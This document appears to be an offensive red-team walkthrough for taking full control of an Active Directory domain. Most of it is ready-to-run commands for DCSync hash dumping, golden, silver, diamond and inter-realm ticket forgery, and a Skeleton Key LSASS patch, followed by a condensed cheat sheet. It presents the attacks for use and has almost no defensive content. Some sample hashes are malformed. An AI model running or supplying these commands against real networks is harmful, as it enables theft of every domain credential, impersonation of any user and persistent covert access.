# Domain Dominance Walkthrough

Step-by-step guide for achieving and maintaining domain-level access in Active Directory.

## Part 1: DCSync Attack

DCSync mimics the behavior of a Domain Controller requesting replication data. This allows extraction of password hashes for any account.

### Prerequisites

DCSync requires one of:
- Domain Admin membership
- Enterprise Admin membership
- DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All rights

### Check DCSync Rights

```powershell
# PowerView - Check who has DCSync rights
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -SearchScope Base -ResolveGUIDs | Where-Object {
    ($_.ObjectAceType -match 'DS-Replication-Get-Changes') -or
    ($_.ActiveDirectoryRights -match 'GenericAll')
} | Select-Object IdentityReferenceName, ObjectAceType, ActiveDirectoryRights
```

```cypher
# BloodHound
MATCH p=(u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
RETURN p
```

### DCSync with secretsdump.py (Linux)

```bash
# Dump all domain credentials
secretsdump.py domain.local/admin:password@dc01.domain.local

# Dump only from NTDS.dit (faster)
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc

# Dump specific user
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user Administrator

# Using NTLM hash
secretsdump.py domain.local/admin@dc01.domain.local -hashes :NTLM_HASH -just-dc

# Using Kerberos ticket
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass domain.local/admin@dc01.domain.local -just-dc

# Output to file
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc -outputfile domain_dump
# Creates: domain_dump.ntds, domain_dump.sam, domain_dump.secrets

# Example output:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a]9bfd4c5c867d25e1a4afa5c29e8c61:::
# [... all domain accounts ...]
```

### DCSync with Mimikatz (Windows)

```powershell
# Single user DCSync
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # lsadump::dcsync /user:domain\Administrator
mimikatz # lsadump::dcsync /user:DC01$ /domain:domain.local

# All accounts (very slow, very noisy)
mimikatz # lsadump::dcsync /all /csv

# Output includes:
# * SAM Account Name        : krbtgt
# * User Principal Name     :
# * Account Type           : 30000000 ( USER_OBJECT )
# * Object Security ID     : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-502
# * Object Relative ID     : 502
#
# Credentials:
# * Hash NTLM: a9bfd4c5c867d25e1a4afa5c29e8c61
#
# * Supplemental Credentials:
#   * Kerberos-Newer-Keys
#     * aes256_hmac (4096) : 0c68c...
#     * aes128_hmac (4096) : 7a3e9...
```

---

## Part 2: Golden Ticket Attack

Golden Tickets are forged TGTs that provide complete domain access.

### Step 1: Gather Requirements

You need:
1. **krbtgt NTLM hash** - From DCSync
2. **Domain SID** - S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
3. **Domain FQDN** - domain.local

```bash
# Get Domain SID
lookupsid.py domain.local/user:password@dc01.domain.local 0
# Output: S-1-5-21-1234567890-1234567890-1234567890

# Or with rpcclient
rpcclient -U 'domain\user%password' dc01.domain.local -c "lsaquery"
```

```powershell
# PowerShell
(Get-ADDomain).DomainSID.Value

# PowerView
Get-DomainSID
```

### Step 2: Create Golden Ticket (Linux)

```bash
# Using ticketer.py
ticketer.py -nthash KRBTGT_NTLM_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  Administrator

# Specify groups (RIDs for Domain Admins, Enterprise Admins, etc.)
ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -groups 512,513,518,519,520 \
  Administrator

# Set custom duration (default 10 years)
ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -duration 365 \
  Administrator

# Using AES256 key (more stealthy)
ticketer.py -aesKey AES256_KEY \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  Administrator

# Output: Administrator.ccache
export KRB5CCNAME=Administrator.ccache
```

### Step 3: Create Golden Ticket (Windows)

```powershell
# Using Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_NTLM_HASH \
  /ticket:golden.kirbi

# With specific groups
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_HASH \
  /groups:512,513,518,519,520 \
  /ticket:golden.kirbi

# With AES256 (more stealthy)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /aes256:AES256_KEY \
  /ticket:golden.kirbi

# Create and inject immediately
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_HASH \
  /ptt
```

### Step 4: Use Golden Ticket

```bash
# Linux - Export and use
export KRB5CCNAME=Administrator.ccache

# Verify ticket
klist

# Use with Impacket tools
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
wmiexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
secretsdump.py -k -no-pass domain.local/Administrator@dc01.domain.local

# Access shares
smbclient //dc01.domain.local/c$ -k -no-pass
```

```powershell
# Windows - Inject and use
mimikatz # kerberos::ptt golden.kirbi

# Verify
klist

# Access resources
dir \\dc01.domain.local\c$
Enter-PSSession -ComputerName dc01.domain.local

# DCSync with Golden Ticket
mimikatz # lsadump::dcsync /user:krbtgt
```

### Golden Ticket for Non-Existent User

Golden Tickets can impersonate users that don't exist:

```bash
# Create ticket for fake user with Domain Admin rights
ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -groups 512 \
  nonexistentadmin

export KRB5CCNAME=nonexistentadmin.ccache
psexec.py domain.local/nonexistentadmin@dc01.domain.local -k -no-pass
```

---

## Part 3: Silver Ticket Attack

Silver Tickets are forged service tickets that don't require KDC interaction.

### Step 1: Get Service Account Hash

```bash
# Computer account hash (for CIFS, HOST, etc.)
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user 'DC01$'

# Service account hash
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user svc_sql
```

### Step 2: Create Silver Ticket (Linux)

```bash
# CIFS ticket for file share access
ticketer.py -nthash COMPUTER_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -spn CIFS/dc01.domain.local \
  Administrator

export KRB5CCNAME=Administrator.ccache
smbclient //dc01.domain.local/c$ -k -no-pass

# HOST ticket for WMI/PSRemoting
ticketer.py -nthash COMPUTER_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -spn HOST/dc01.domain.local \
  Administrator

# LDAP ticket for directory queries
ticketer.py -nthash COMPUTER_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -spn LDAP/dc01.domain.local \
  Administrator

# HTTP ticket for WinRM
ticketer.py -nthash COMPUTER_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -spn HTTP/dc01.domain.local \
  Administrator

# MSSQL ticket for SQL Server
ticketer.py -nthash SERVICE_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -spn MSSQLSvc/sql01.domain.local:1433 \
  Administrator
```

### Step 3: Create Silver Ticket (Windows)

```powershell
# Mimikatz - CIFS Silver Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:dc01.domain.local \
  /service:CIFS \
  /rc4:COMPUTER_NTLM_HASH \
  /ticket:silver_cifs.kirbi

# HOST Silver Ticket (for PSRemoting, scheduled tasks)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:dc01.domain.local \
  /service:HOST \
  /rc4:COMPUTER_NTLM_HASH \
  /ticket:silver_host.kirbi

# HTTP Silver Ticket (for WinRM)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:dc01.domain.local \
  /service:HTTP \
  /rc4:COMPUTER_NTLM_HASH \
  /ticket:silver_http.kirbi

# Inject and use
mimikatz # kerberos::ptt silver_cifs.kirbi
dir \\dc01.domain.local\c$
```

### Common Silver Ticket SPNs

| Service | SPN | Use Case |
|---------|-----|----------|
| CIFS | CIFS/hostname | File shares (\\host\share) |
| HOST | HOST/hostname | WMI, Scheduled Tasks, PSRemoting |
| HTTP | HTTP/hostname | WinRM, Web services |
| LDAP | LDAP/hostname | Directory queries |
| MSSQLSvc | MSSQLSvc/hostname:port | SQL Server |
| WSMAN | WSMAN/hostname | WinRM |
| RPCSS | RPCSS/hostname | RPC services |
| TERMSRV | TERMSRV/hostname | RDP (doesn't work for NLA) |

---

## Part 4: Skeleton Key Attack

Skeleton Key patches LSASS on the Domain Controller to accept a master password for any account.

### Prerequisites

- Domain Admin access
- Access to execute code on DC

### Deploy Skeleton Key

```powershell
# On Domain Controller with Mimikatz
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Default skeleton key password: mimikatz

# Now ANY account authenticates with "mimikatz" as password
# Original passwords still work
```

### Use Skeleton Key

```bash
# Authenticate as any user with skeleton password
psexec.py domain.local/Administrator:mimikatz@dc01.domain.local
wmiexec.py domain.local/anyuser:mimikatz@dc01.domain.local
smbclient //dc01.domain.local/c$ -U 'domain\anyuser%mimikatz'
```

### Skeleton Key Limitations

- Non-persistent - cleared on DC reboot
- Only works on patched DC
- Requires re-deployment after reboot
- Detectable by LSASS memory analysis

---

## Part 5: Advanced Techniques

### Cross-Domain Golden Ticket (Forest)

With Enterprise Admin krbtgt, forge tickets valid across forest:

```bash
# Get Enterprise Admin SID
# Enterprise Admins: S-1-5-21-<root domain SID>-519

ticketer.py -nthash ROOT_KRBTGT_HASH \
  -domain-sid S-1-5-21-ROOT-DOMAIN-SID \
  -domain root.domain.local \
  -extra-sid S-1-5-21-CHILD-DOMAIN-SID-519 \
  Administrator

# Access child domains with this ticket
export KRB5CCNAME=Administrator.ccache
psexec.py root.domain.local/Administrator@dc01.child.domain.local -k -no-pass
```

### Diamond Ticket

Diamond Tickets modify legitimate TGT rather than forging from scratch:

```powershell
# Request real TGT, then modify with Rubeus
.\Rubeus.exe diamond /krbkey:AES256_KEY /tgtdeleg /ticketuser:Administrator \
  /ticketuserid:500 /groups:512
```

### Trust Ticket (Inter-Domain)

Forge inter-realm TGT using trust key:

```bash
# Get trust key from DCSync
secretsdump.py ... -just-dc-user 'child$'

# Forge trust ticket
ticketer.py -nthash TRUST_KEY \
  -domain-sid CHILD_SID \
  -domain child.domain.local \
  -spn krbtgt/ROOT.DOMAIN.LOCAL \
  Administrator
```

---

## Troubleshooting

### Common Errors

**KRB_AP_ERR_SKEW**
```bash
# Time difference > 5 minutes
sudo ntpdate dc01.domain.local
```

**KRB_AP_ERR_MODIFIED**
```bash
# Hash is wrong or ticket is malformed
# Verify krbtgt hash is current (may have been rotated)
```

**Access Denied with Valid Ticket**
```bash
# Check ticket is for correct service
# Silver Ticket: SPN must match exactly
klist
```

**Silver Ticket Rejected**
```bash
# PAC validation is enabled
# Try different service on same host
# Or use Golden Ticket instead
```

---

## Quick Reference

### DCSync
```bash
secretsdump.py DOMAIN/admin:pass@DC -just-dc
secretsdump.py DOMAIN/admin@DC -hashes :HASH -just-dc-user krbtgt
mimikatz # lsadump::dcsync /user:krbtgt
```

### Golden Ticket
```bash
# Get SID
lookupsid.py DOMAIN/user:pass@DC 0

# Create ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass DOMAIN/Administrator@TARGET

# Mimikatz
mimikatz # kerberos::golden /user:Admin /domain:X /sid:X /krbtgt:X /ptt
```

### Silver Ticket
```bash
ticketer.py -nthash SERVICE_HASH -domain-sid SID -domain DOMAIN -spn CIFS/HOST Administrator
export KRB5CCNAME=Administrator.ccache
smbclient //HOST/c$ -k -no-pass

# Mimikatz
mimikatz # kerberos::golden /user:X /domain:X /sid:X /target:HOST /service:CIFS /rc4:X /ptt
```

### Skeleton Key
```powershell
mimikatz # misc::skeleton
# All accounts accept "mimikatz" as password
```
